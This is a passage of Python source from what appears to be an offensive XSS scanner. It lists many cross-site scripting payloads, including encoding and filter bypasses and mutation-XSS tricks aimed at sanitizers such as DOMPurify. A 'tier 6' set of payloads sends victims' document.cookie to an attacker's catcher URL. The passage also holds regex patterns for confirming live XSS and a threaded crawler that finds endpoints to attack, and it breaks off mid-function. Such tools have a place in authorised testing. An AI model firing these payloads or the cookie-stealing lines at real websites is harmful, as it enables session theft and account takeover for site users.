    {"id":"t5x_div_binding",   "pl":'<DIV style="binding: url(javascript:alert(1));">', "tier":5,"type":"html"},
    # style onload with HTML comment bypass
    {"id":"t5x_style_cmt_scr", "pl":'<style><!--</style><script>alert(1);//--></script>', "tier":5,"type":"html"},
    # plaintext onmouseover
    {"id":"t5x_plaintext_om",  "pl":'</plaintext\\></|\\><plaintext/onmouseover=prompt(1)', "tier":5,"type":"attr"},
    # ScRipT 5-0*3+9/3 (Opera eval)
    {"id":"t5x_scr_expr_opera","pl":'<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?', "tier":5,"type":"html"},
    # blink onmouseover (Firefox/Opera)
    {"id":"t5x_blink_om",      "pl":'<blink onmouseover=prompt(1)>OnMouseOver</blink>',   "tier":5,"type":"attr"},
    # marquee onstart javascript: (encoded)
    {"id":"t5x_marquee_enc",   "pl":'<marquee onstart=\'javascript:alert&#x28;1&#x29;\'>^__^', "tier":5,"type":"html"},
    # img src @ + onerror prompt (Opera/FF)
    {"id":"t5x_img_at_err",    "pl":'<img/src=@&#32;&#13; onerror = prompt(\'1\')>',      "tier":5,"type":"html"},
    # iframe %00 src Tab javascript:
    {"id":"t5x_iframe_null",   "pl":'<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>', "tier":5,"type":"html"},
    # iframe /%00/ src javaScript:
    {"id":"t5x_iframe_pnull",  "pl":'<iframe/%00/ src=javaSCRIPT:alert(1)',               "tier":5,"type":"html"},
    # svg style font-family iframe/onload
    {"id":"t5x_svg_style_ff",  "pl":'<svg><style>{font-family\'<iframe/onload=confirm(1)>\'',  "tier":5,"type":"html"},
    # input onmouseover javaScript colon entity
    {"id":"t5x_input_js_ent",  "pl":'<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"', "tier":5,"type":"attr"},
    # sVg scRipt %00 alert Opera
    {"id":"t5x_svg_null_opera","pl":'<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}',        "tier":5,"type":"html"},
    # img src %00 onerror=this.onerror
    {"id":"t5x_img_self_err",  "pl":'<img/src=`%00` onerror=this.onerror=confirm(1)',     "tier":5,"type":"html"},
    # form isindex formaction javascript: entity
    {"id":"t5x_isidx_fa_ent",  "pl":'<form><isindex formaction="javascript&colon;confirm(1)"', "tier":5,"type":"html"},
    # img %00 NewLine onerror
    {"id":"t5x_img_nl_null",   "pl":'<img src=`%00`&NewLine; onerror=alert(1)&NewLine;',  "tier":5,"type":"html"},
    # script tab src (external load through tab obfuscation)
    {"id":"t5x_scr_tab_src",   "pl":'<script/&Tab; src=\'https://dl.dropbox.com/u/13018058/js.js\' /&Tab;></script>', "tier":5,"type":"html"},
    # iframe Tab-split base64 src
    {"id":"t5x_iframe_tab_b64","pl":'<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',  "tier":5,"type":"html"},
    # script /**/ comment null bypass
    {"id":"t5x_scr_null_cmt",  "pl":'<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/>',  "tier":5,"type":"html"},
    # h1 onmouseover unicode alert
    {"id":"t5x_h1_uni_alert",  "pl":'&#34;&#62;<h1/onmouseover=\'\\u0061lert(1)\'>%00',  "tier":5,"type":"html"},
    # iframe data html svg entity onload
    {"id":"t5x_ifr_data_svg",  "pl":'<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">',  "tier":5,"type":"html"},
    # meta NewLine JAVASCRIPT colon refresh
    {"id":"t5x_meta_nl_js",    "pl":'<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>',  "tier":5,"type":"html"},
    # a href javascript unicode lert
    {"id":"t5x_a_js_uni_lert", "pl":'<a href="javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>',  "tier":5,"type":"html"},
    # img src backtick onerror
    {"id":"t5x_img_btick_err", "pl":'<img src=`xx:xx`onerror=alert(1)>',               "tier":5,"type":"html"},
    # iframe onreadystatechange unicode alert
    {"id":"t5x_ifr_rsc_uni",   "pl":'<iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074(\'\\u0061\') worksinIE>', "tier":5,"type":"html"},
    # script unicode throw alert
    {"id":"t5x_scr_uni_throw", "pl":'<script>~\'\\u0061\' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~\'\\u0061\')</script>', "tier":5,"type":"js"},
    # script +-+ obfuscation
    {"id":"t5x_scr_plusminus", "pl":'<script>+-+-1-+-+alert(1)</script>',              "tier":5,"type":"js"},
    # body onload html-comment newline
    {"id":"t5x_body_cmt_load", "pl":'<body/onload=&lt;!--&gt;&#10;alert(1)>',          "tier":5,"type":"html"},
    # script itworksinallbrowsers comment
    {"id":"t5x_scr_allbrowser","pl":'<script itworksinallbrowsers>/*<script* */alert(1)</script', "tier":5,"type":"js"},
    # img src ? itworksonchrome ? onerror
    {"id":"t5x_img_chrome_q",  "pl":'<img src ?itworksonchrome?\\/onerror = alert(1)', "tier":5,"type":"html"},
    # svg script NewLine confirm
    {"id":"t5x_svg_nl_confirm","pl":'<svg><script>//&NewLine;confirm(1);</script </svg>',  "tier":5,"type":"html"},
    # a href with excess whitespace attr padding
    {"id":"t5x_a_excess_attr", "pl":'<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe', "tier":5,"type":"html"},
    # script x (IE/Safari)
    {"id":"t5x_scr_x",         "pl":'<script x> alert(1) </script 1=2>',              "tier":5,"type":"js"},
    # div onmouseover + broken style context
    {"id":"t5x_div_om_broken", "pl":'<div/onmouseover=\'alert(1)\'> style="x:">',     "tier":5,"type":"attr"},
    # dangling less-than img src onerror
    {"id":"t5x_dangling_lt",   "pl":'<--`<img/src=` onerror=alert(1)> --!>',          "tier":5,"type":"html"},
    # script src data entity-encoded
    {"id":"t5x_scr_data_ent",  "pl":'<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>', "tier":5,"type":"html"},
    # style escape then script via event
    {"id":"t5x_style_esc_scr", "pl":'</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(',  "tier":5,"type":"html"},
    # style onload HTML comment injection
    {"id":"t5x_style_onload_cmt","pl":'<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>',  "tier":5,"type":"html"},
    # triple-slash style + span onmousemove
    {"id":"t5x_trislash_span", "pl":'<///style///><span %2F onmousemove=\'alert&lpar;1&rpar;\'>SPAN', "tier":5,"type":"attr"},
    # img onmouseover Tab prompt
    {"id":"t5x_img_tab_prompt","pl":'<img/src=\'http://i.imgur.com/P8mL8.jpg\' onmouseover=&Tab;prompt(1)', "tier":5,"type":"attr"},
    # svg o-link-source body/onload confirm
    {"id":"t5x_svg_olink",     "pl":'&#34;&#62;<svg><style>{-o-link-source:\'<body/onload=confirm(1)>\'',  "tier":5,"type":"html"},
    # CR blink onmouseover prompt entity
    {"id":"t5x_cr_blink_pr",   "pl":'&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver',  "tier":5,"type":"attr"},
    # form textarea CR onkeyup unicode
    {"id":"t5x_textarea_kup",  "pl":'<form><textarea &#13; onkeyup=\'\\u0061\\u006C\\u0065\\u0072\\u0074&#x28;1&#x29;\'>',  "tier":5,"type":"attr"},
    # script confirm unicode fullwidth
    {"id":"t5x_confirm_fw",    "pl":'<script /***/>/***/confirm(\'\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450\')/***/</script /***/>',  "tier":5,"type":"js"},
    # a href void + NewLine javascript onmouseover
    {"id":"t5x_a_nl_om",       "pl":'<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>',  "tier":5,"type":"attr"},
    # script ~~~ alert(0%0)
    {"id":"t5x_scr_tilde",     "pl":'<script ~~~>alert(0%0)</script ~~~>',            "tier":5,"type":"js"},
    # div absolute iframe onmouseover prompt
    {"id":"t5x_div_abs_iframe","pl":'<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">', "tier":5,"type":"attr"},
    # img window.open onerror
    {"id":"t5x_img_winopen",   "pl":'"><img src=x onerror=window.open(\'https://www.google.com/\');>',  "tier":5,"type":"attr"},
    # img src prompt onerror
    {"id":"t5x_img_prompt_err","pl":'"><img src=x onerror=prompt(1);>',               "tier":5,"type":"attr"},
    # CSS dot-class background-image javascript:
    {"id":"t5x_css_class_bg",  "pl":'<STYLE>.XSS{background-image:url("javascript:alert(\'XSS\')")}</STYLE><A CLASS=XSS></A>', "tier":5,"type":"html"},
    # STYLE TYPE text/javascript
    {"id":"t5x_style_js_type", "pl":'<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',  "tier":5,"type":"html"},
    # XML namespace import
    {"id":"t5x_xml_ns",        "pl":'<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>', "tier":5,"type":"html"},
    # data URI + charset UTF-7
    {"id":"t5x_data_utf7",     "pl":'data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=', "tier":5,"type":"html"},
    # OBJECT classid
    {"id":"t5x_obj_classid",   "pl":'<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert(\'XSS\')></OBJECT>', "tier":5,"type":"html"},
    # script ^ crazy ^ tag (IE/Safari)
    {"id":"t5x_scr_hat",       "pl":'<script ^__^>alert(String.fromCharCode(49))</script ^__^>',  "tier":5,"type":"js"},
    # a href feed:javascript (Firefox old)
    {"id":"t5x_feed_js",       "pl":'<a href="feed:javascript&colon;alert(1)">click</a>',  "tier":5,"type":"html"},
    # embed SWF allowscriptaccess
    {"id":"t5x_embed_swf",     "pl":'<embed src="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></embed>',  "tier":5,"type":"html"},
    # script ReferenceError prototype name defineGetter
    {"id":"t5x_ref_err_proto", "pl":'<script>ReferenceError.prototype.__defineGetter__(\'name\', function(){alert(123)}),x</script>', "tier":5,"type":"js"},
    # script src # + {alert(1)} (quirky execution)
    {"id":"t5x_scr_hash_body", "pl":'<script src="#">{alert(1)}</script>;1',           "tier":5,"type":"js"},
    # XML version + someElement a xmlns xhtml body onload
    {"id":"t5x_xml_xhtml",     "pl":'<?xml version="1.0" ?><someElement><a xmlns:a=\'http://www.w3.org/1999/xhtml\'><a:body onload=\'alert(1)\'/></a></someElement>',  "tier":5,"type":"html"},
    # CDATA SCRIPT split (XML)
    {"id":"t5x_cdata_scr",     "pl":'<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>',  "tier":5,"type":"html"},
    # ADw+AD4 UTF-7 alert
    {"id":"t5x_adw_utf7",      "pl":'%2BADw-script%2BAD4-alert(document.location)%2BADw-%2Fscript%2BAD4-',  "tier":5,"type":"html"},
    # ></textarea>'"><script>alert(XSS)</script>  (textarea context break)
    {"id":"t5x_textarea_brk",  "pl":"</textarea>'\"'><script>alert(XSS)</script>",     "tier":5,"type":"js"},
    # '</select><script>alert(XSS)</script>
    {"id":"t5x_select_brk",    "pl":"'></select><script>alert(XSS)</script>",          "tier":5,"type":"js"},
    # noalert/noscript bypass
    {"id":"t5x_noscript_brk",  "pl":'<html><noalert><noscript>(XSS)</noscript><script>(XSS)</script>',  "tier":5,"type":"html"},
    # </script></script><<<< multi-close
    {"id":"t5x_multi_close",   "pl":'</script></script><<<<script><>>>><<<script>alert(XSS)</script>',  "tier":5,"type":"js"},
    # a href data: blabla + script src exfil
    {"id":"t5x_a_data_blabla", "pl":'<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>',  "tier":5,"type":"html"},


    # ─────────────────────────────────────────────────────────────────────
    # TIER 5 — mXSS (Mutation XSS) — sanitizer bypass via DOM re-parsing
    # These bypass DOMPurify, angular sanitization, and similar filters.
    # The browser mutates the HTML after sanitizer runs → XSS executes.
    # ─────────────────────────────────────────────────────────────────────
    {"id":"mxss_svg_style",    "pl":'<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">',             "tier":5,"type":"mxss"},
    {"id":"mxss_math_ann",     "pl":'<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>', "tier":5,"type":"mxss"},
    {"id":"mxss_table_svg",    "pl":'<table><td><svg><script>alert(1)</script></td></table>',                   "tier":5,"type":"mxss"},
    {"id":"mxss_noscript",     "pl":'<noscript><p title="</noscript><img src=1 onerror=alert(1)>">',            "tier":5,"type":"mxss"},
    {"id":"mxss_form_math",    "pl":'<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>', "tier":5,"type":"mxss"},
    {"id":"mxss_ruby",         "pl":'<ruby><rt><![CDATA[x]]></rt><script>alert(1)</script></ruby>',            "tier":5,"type":"mxss"},
    {"id":"mxss_style_chr",    "pl":'<style>@charset "\";}</style><script>alert(1)</script>',                  "tier":5,"type":"mxss"},
    {"id":"mxss_svg_ns",       "pl":'<svg xmlns="http://www.w3.org/2000/svg"><script xmlns="">alert(1)</script></svg>', "tier":5,"type":"mxss"},
    {"id":"mxss_math_mglyph",  "pl":'<math><mtext><table><mglyph><style><img src onerror=alert(1)>',           "tier":5,"type":"mxss"},
    {"id":"mxss_svg_animate",  "pl":'<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>', "tier":5,"type":"mxss"},
    {"id":"mxss_select",       "pl":'<select><option><img src=1 onerror=alert(1)></option></select>',          "tier":5,"type":"mxss"},
    {"id":"mxss_svg_a_xlink",  "pl":'<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=400 /></a></svg>', "tier":5,"type":"mxss"},
    # ─────────────────────────────────────────────────────────────────────
    # TIER 6 — cookie exfiltration (fires after tier ≤5 confirm XSS)
    # Only used when a catcher URL is available.
    # ─────────────────────────────────────────────────────────────────────
    {"id":"t6_ck_img",        "pl":'<img src=x onerror="document.location=\'CATCHER?c=\'+document.cookie">',  "tier":6,"type":"cookie"},
    {"id":"t6_ck_fetch",      "pl":"<script>fetch('CATCHER?c='+encodeURIComponent(document.cookie))</script>", "tier":6,"type":"cookie"},
    {"id":"t6_ck_img2",       "pl":"<script>new Image().src='CATCHER?c='+document.cookie</script>",            "tier":6,"type":"cookie"},
    {"id":"t6_ck_loc",        "pl":'<svg onload="document.location=\'CATCHER?c=\'+document.cookie">',          "tier":6,"type":"cookie"},
    {"id":"t6_ck_iframe",     "pl":'<iframe src="javascript:document.location=\'CATCHER?c=\'+parent.document.cookie">',  "tier":6,"type":"cookie"},
]

# ─────────────────────────────────────────────────────────────────────────────
# XSS CONFIRMATION PATTERNS
# Applied by XSSVerifier to decide if a reflection is live XSS.
# Covers all new event handlers, elements, and JS call patterns added above.
# ─────────────────────────────────────────────────────────────────────────────
XSS_CONFIRM_RE = [
    # Script block with alert
    re.compile(r'<script[^>]*>\s*alert',                              re.I | re.S),
    # Any on* handler = alert (broad — catches all the element+event combos)
    re.compile(r'\bon\w+\s*=\s*alert',                                re.I),
    # javascript: protocol
    re.compile(r'javascript\s*:',                                     re.I),
    # SVG onload
    re.compile(r'<svg[^>]*onload\s*=',                                re.I),
    # img/image/audio/video onerror/onload
    re.compile(r'<(?:img|image|audio|video)[^>]*on(?:error|load|loadstart)\s*=', re.I),
    # iframe srcdoc
    re.compile(r'<iframe[^>]*srcdoc',                                 re.I),
    # details ontoggle
    re.compile(r'<details[^>]*ontoggle',                              re.I),
    # input/keygen autofocus onfocus
    re.compile(r'<(?:input|keygen)[^>]*onfocus',                      re.I),
    # body/html global events
    re.compile(r'<(?:body|html)[^>]*on(?:load|pageshow|focus|hashchange|resize|scroll|message|popstate|orientationchange|touchstart|touchend|touchmove|unhandledrejection|wheel|afterprint|beforeprint|beforeunload)\s*=', re.I),
    # marquee onstart/onfinish
    re.compile(r'<marquee[^>]*on(?:start|finish)\s*=',               re.I),
    # form/button/input formaction javascript:
    re.compile(r'formaction\s*=\s*["\']?javascript\s*:',             re.I),
    # object data javascript:
    re.compile(r'<object[^>]*data\s*=\s*["\']?javascript\s*:',       re.I),
    # embed src javascript:
    re.compile(r'<embed[^>]*src\s*=\s*["\']?javascript\s*:',         re.I),
    # xlink:href javascript:
    re.compile(r'xlink:href\s*=\s*["\']?javascript\s*:',             re.I),
    # SVG animate with javascript:
    re.compile(r'<animate[^>]*from\s*=\s*["\']?javascript\s*:',      re.I),
    # data: URI script
    re.compile(r'src\s*=\s*["\']?data:\s*&comma;\s*alert',           re.I),
    # Obfuscated alert calls (backtick, array, eval, base36)
    re.compile(r'alert`\d',                                           re.I),
    re.compile(r'\[1\]\.find\s*\(\s*alert\s*\)',                      re.I),
    re.compile(r'top\s*\[.*alert.*\]',                                re.I),
    re.compile(r'eval\s*\(\s*(?:URL|location)',                       re.I),
    re.compile(r'8680439\.\.toString',                                re.I),
    # GIF polyglot
    re.compile(r'GIF89a.*<svg',                                       re.I | re.S),
    # tabindex+onfocus/onfocusin
    re.compile(r'tabindex\s*=.*on(?:focus|focusin)\s*=\s*alert',     re.I),
    # Contenteditable + any interaction handler
    re.compile(r'contenteditable[^>]*on(?:paste|copy|cut|keydown|keyup|keypress|input|blur)\s*=\s*alert', re.I),
    # Drag events
    re.compile(r'on(?:drag|dragstart|dragend|dragenter|dragleave)\s*=\s*alert', re.I),
    # Audio/video media events
    re.compile(r'on(?:canplay|loadeddata|loadedmetadata|play|playing|pause|ended|timeupdate|volumechange|seeked|seeking)\s*=\s*alert', re.I),
    # menu onshow
    re.compile(r'<menu[^>]*onshow\s*=',                               re.I),
    # button/link/anchor misc events
    re.compile(r'on(?:contextmenu|dblclick|mousedown|mouseup|mousemove|mouseenter|mouseleave|mouseout)\s*=\s*alert', re.I),
    # innerHTML / location hash
    re.compile(r'innerHTML\s*=\s*location\.hash',                     re.I),
    # String.fromCharCode execution
    re.compile(r'String\.fromCharCode\s*\(',                           re.I),
    # eval(String['fromCharCode'](...))
    re.compile(r"eval\s*\(\s*String\s*\[",                           re.I),
    # UTF-7 +ADw- script +AD4-
    re.compile(r'\+ADw-script\+AD4-',                                   re.I),
    # formaction javascript:
    re.compile(r'formaction\s*=\s*["\'\']?javascript',                re.I),
    # style expression (IE)
    re.compile(r'style[^>]*expression\s*\(',                            re.I),
    # object data base64 / embed src base64
    re.compile(r'(?:data|src)\s*=\s*["\'\']?data:(?:text/html|image/svg)',  re.I),
    # vbscript: protocol
    re.compile(r'vbscript\s*:',                                          re.I),
    # onreadystatechange
    re.compile(r'onreadystatechange\s*=',                                re.I),
    # xlink:href data:
    re.compile(r'xlink:href\s*=\s*["\'\']?data:',                    re.I),
    # img/video/audio src backtick onerror
    re.compile(r'src\s*=\s*`[^`]*`\s*onerror',                        re.I),
    # BGSOUND src javascript:
    re.compile(r'<bgsound[^>]*src\s*=\s*["\'\']?javascript',         re.I),
    # LAYER src
    re.compile(r'<layer[^>]*src\s*=',                                    re.I),
    # TABLE/TD/DIV BACKGROUND javascript:
    re.compile(r'background\s*=\s*["\'\']?javascript',                re.I),
    # LINK REL stylesheet javascript:
    re.compile(r'<link[^>]*href\s*=\s*["\'\']?javascript',           re.I),
    # BASE href javascript:
    re.compile(r'<base[^>]*href\s*=\s*["\'\']?javascript',           re.I),
    # INPUT TYPE=IMAGE SRC javascript:
    re.compile(r'<input[^>]*type\s*=\s*["\'\']?image["\'\'][^>]*src\s*=\s*["\'\']?javascript', re.I),
    # FRAMESET FRAME src javascript:
    re.compile(r'<frame[^>]*src\s*=\s*["\'\']?javascript',           re.I),
    # META http-equiv refresh javascript:/data:
    re.compile(r'<meta[^>]*content\s*=.*(?:javascript:|data:text/html)', re.I),
    # isindex formaction/action javascript:
    re.compile(r'<isindex[^>]*(?:form)?action\s*=\s*["\'\']?javascript', re.I),
    # confirm( call — used by many payloads
    re.compile(r'confirm\s*\(',                                          re.I),
    # prompt( call
    re.compile(r'prompt\s*\(',                                           re.I),
    # window.open via onerror
    re.compile(r'onerror\s*=.*window\.open',                            re.I),
    # document.write in onerror/onload
    re.compile(r'(?:onerror|onload)\s*=.*document\.write',             re.I),
    # script for=document event=onreadystatechange (IE)
    re.compile(r'<script[^>]*for\s*=\s*document[^>]*event\s*=',       re.I),
    # style onload (Webkit/FF)
    re.compile(r'<style[^>]*onload\s*=',                                 re.I),
    # mXSS — annotation-xml text/html (DOMPurify bypass)
    re.compile(r'annotation-xml[^>]*encoding.*text/html',                 re.I),
    # mXSS — mglyph/style after math (mutation)
    re.compile(r'<mglyph[^>]*>.*?<style>',                                re.I | re.S),
    # mXSS — SVG script after table
    re.compile(r'<table[^>]*>.*?<svg>.*?<script>',                        re.I | re.S),
    # mXSS — animate attributeName=href javascript:
    re.compile(r'<animate[^>]*attributeName\s*=\s*["\']?href',        re.I),
    # uXSS — document.domain in alert
    re.compile(r'alert\s*\(\s*document\.domain',                      re.I),
]


# ─────────────────────────────────────────────────────────────────────────────
# THREADED CRAWLER  — HELLHOUND ThreadPoolExecutor architecture
# ─────────────────────────────────────────────────────────────────────────────
class Crawler:
    """
    HELLHOUND-style threaded crawler adapted for XSS endpoint discovery.

    Architecture:
      - ThreadPoolExecutor with configurable worker count (default 10)
      - _visited_lock  protects shared visited set (thread-safe dedup)
      - _ep_lock       protects shared endpoints list
      - _print_lock    (global) for thread-safe console output
      - Batched crawling: process current_batch → collect new_links → repeat
      - JS files tagged with __JS__ prefix, processed by separate worker pool

    Differences from v3.1 sequential crawler:
      - All pages in a batch process concurrently (10x+ speed on deep sites)
      - JS extraction runs in parallel alongside HTML processing
      - Progress shown as live counter, not per-page noise
      - Thread-safe endpoint dedup via _ep_lock
    """
    def __init__(self, base, client, max_pages=80, max_depth=3, threads=10):
        self.base       = base.rstrip("/")
        self._bp        = urllib.parse.urlparse(base)
        self.client     = client
        self.max_pages  = max_pages
        self.max_depth  = max_depth
        self.threads    = threads
        # HELLHOUND-style locks
        self._visited_lock = threading.Lock()
        self._ep_lock      = threading.Lock()
        self.visited    = set()
        self.js_visited = set()
        self.endpoints  = []
        self._js        = JSExtractor()
        self.spa_count  = 0

    def _same_domain(self, url):
        return urllib.parse.urlparse(url).netloc == self._bp.netloc

    def _normalize(self, url):
        p = urllib.parse.urlparse(url)
        return urllib.parse.urlunparse(
            (p.scheme, p.netloc, p.path, p.params, p.query, ""))

    def _add_endpoint(self, url, method, params, hidden, source):
        if not params: return
        with self._ep_lock:
            key = (url, method, frozenset(params.keys()))
            exists = any(
                (e["url"], e["method"], frozenset(e["params"].keys())) == key
                for e in self.endpoints)
            if not exists:
                self.endpoints.append({
                    "url":    url,
                    "method": method,
                    "params": params,
                    "hidden": hidden or {},
                    "source": source,
                })

    def _process_js(self, js_url):
        """Process one JS file — extract endpoints, return new page links."""
        with self._visited_lock:
            if js_url in self.js_visited: return []
            self.js_visited.add(js_url)

        resp = self.client.get_raw(js_url)
        if not resp["ok"] or resp["status"] == 0: return []

        endpoints = self._js.extract(resp["body"], self.base)
        new_links = []

        for ep in endpoints:
            path = ep["path"]
            full = (path if path.startswith("http")
                    else urllib.parse.urljoin(self.base, path))
            if not self._same_domain(full): continue

            if ep["params"]:
                params = {p: "test" for p in ep["params"]}
                self._add_endpoint(full, ep["method"], params, {}, f"js:{js_url[-40:]}")
                with self._ep_lock:
                    self.spa_count += 1
                _m = ep["method"]; _p = path[:55]; _pc = len(ep["params"])
                tprint(f"  {js_ep(f'{_m} {_p} [{_pc} params] ← {js_url[-35:]}')}")
            else:
                norm = self._normalize(full)
                with self._visited_lock:
                    if (norm not in self.visited
                            and len(self.visited) < self.max_pages):
                        self.visited.add(norm)
                        new_links.append((full, 1))

        # WebSocket endpoints: log but don't add as testable (no HTTP params)
        # REST/API patterns common in SPAs
        patterns = [
            re.compile(r'axios\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
            re.compile(r'fetch\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
            re.compile(r'\$\.(get|post|ajax)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
            re.compile(r'(?:this\.|self\.)?(?:http|api)\.(get|post|put|delete|patch)\s*\(\s*["\`]([^"\`\n]{3,80})["\`]', re.I),
            re.compile(r'XMLHttpRequest[^;]{0,200}\.open\s*\(\s*["\']([A-Z]+)["\']\s*,\s*["\']([^"\']{3,80})["\']', re.I),
            re.compile(r'["\`](/(?:api|v\d+|rest|graphql|admin|auth|user|account|search|upload|ws)[a-zA-Z0-9_\-\./]*)["\`]', re.I),
            re.compile(r'(?:router|app|Route)\s*\.\s*(get|post|put|delete|patch|use)\s*\(\s*["\']([^"\']{2,60})["\']', re.I),
        ]
        # Parameter extraction from JS strings/json
        param_patterns = [
            re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=', re.I),
            re.compile(r'["\']?([a-zA-Z_][a-zA-Z0-9_]{1,30})["\']?\s*:', re.I), # JSON keys
        ]
        for ws in ep.get("ws_endpoints", []) if endpoints else []:
            tprint(f"  {js_ep(f'WS endpoint: {ws[:70]}')}")

        return new_links

    def _process_page(self, url, depth):
        """
        Fetch one page, extract forms/params/inline-JS/links.
        Returns list of (new_url, depth) tuples for the next batch.
        """
        resp   = self.client.get(url)
        status = resp["status"]

        # Live counter (HELLHOUND style — overwrite same line)
        with self._visited_lock:
            n = len(self.visited)
        sys.stdout.write(
            f"\r  {color(f'  crawling... {n} pages found', C.DIM)}  ")
        sys.stdout.flush()

        if status == 0: return []

        # Query-string params from URL itself
        parsed = urllib.parse.urlparse(url)
        qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if qs:
            clean  = parsed._replace(query="").geturl()
            params = {k: (v[0] if v else "") for k, v in qs.items()}
            self._add_endpoint(clean, "GET", params, None, "url_query")

        new_links = []
        ct   = resp["headers"].get("content-type", "")
        body = resp.get("body", "")

        if "html" in ct or body.lstrip().startswith("<"):
            parser = PageParser(url)
            try: parser.feed(body)
            except Exception: pass

            # Forms
            for form in parser.forms:
                testable = {i["name"]: i["value"]
                            for i in form["inputs"] if i["type"] != "hidden"}
                hidden   = {i["name"]: i["value"]
                            for i in form["inputs"] if i["type"] == "hidden"}
                if testable:
                    self._add_endpoint(form["action"], form["method"],
                                       testable, hidden, f"form@{url[:40]}")

            # Inline scripts — use enhanced JSExtractor
            for sc in re.findall(r'<script[^>]*>(.*?)</script>', body,
                                  re.DOTALL | re.I):
                if len(sc) > 50:
                    for ep in self._js.extract(sc, url):
                        if ep["params"]:
                            full = urllib.parse.urljoin(url, ep["path"])
                            if self._same_domain(full):
                                self._add_endpoint(
                                    full, ep["method"],
                                    {p: "test" for p in ep["params"]},
                                    {}, f"inline_js@{url[-30:]}")

            # Follow links
            if depth < self.max_depth:
                for link in parser.links:
                    norm = self._normalize(link)
                    with self._visited_lock:
                        if (norm not in self.visited
                                and self._same_domain(link)
                                and len(self.visited) < self.max_pages):
                            self.visited.add(norm)
                            new_links.append((link, depth + 1))

            # Queue JS files for parallel processing
            for js_url in parser.js_links:
                with self._visited_lock:
                    if js_url not in self.js_visited:
                        new_links.append((f"__JS__{js_url}", 0))

        elif "javascript" in ct or url.endswith(".js"):
            new_links.extend(self._process_js(url))

        return new_links

    def _parse_robots(self):
        """Standard robots.txt parsing."""
        robots_url = urllib.parse.urljoin(self.base, "/robots.txt")
        resp = self.client.get(robots_url)
        if resp["ok"] and resp["status"] == 200:
            paths = re.findall(r'(?:Allow|Disallow):\s*(\/\S*)', resp["body"], re.I)
            if paths:
                tprint(f"  {info(f'Discovered {len(paths)} paths from robots.txt')}")
                for p in paths:
                    full = urllib.parse.urljoin(self.base, p)
                    if self._same_domain(full):
                        self._normalize(full)
                        with self._visited_lock:
                            if len(self.visited) < self.max_pages:
                                self.visited.add(full)
                                yield (full, 1)

    def _parse_sitemap(self):
        """Standard sitemap.xml parsing."""
        sitemap_url = urllib.parse.urljoin(self.base, "/sitemap.xml")
        resp = self.client.get(sitemap_url)
        if resp["ok"] and resp["status"] == 200:
            urls = re.findall(r'<loc>(https?://[^<]+)</loc>', resp["body"], re.I)
            if urls:
                tprint(f"  {info(f'Discovered {len(urls)} URLs from sitemap.xml')}")
                for u in urls:
                    if self._same_domain(u):
                        with self._visited_lock:
                            if len(self.visited) < self.max_pages:
                                self.visited.add(u)
                                yield (u, 1)

    def crawl(self):
        """
        HELLHOUND-style batched ThreadPoolExecutor crawl.
        Processes html_batch and js_batch concurrently each round.
        Shows live progress counter and summary on completion.
        """
        section(f"PHASE 1/5 — RECONNAISSANCE & DISCOVERY [INTERNAL ENGINE]", "🕷")
        tprint(f"  {color('─'*68, C.DIM)}")
        tprint(f"  {info(f'Threads: {self.threads} | Max pages: {self.max_pages} | Depth: {self.max_depth}')}\n")

        norm_base = self._normalize(self.base)
        with self._visited_lock:
            self.visited.add(norm_base)

        current_batch = [(self.base, 0)]
        
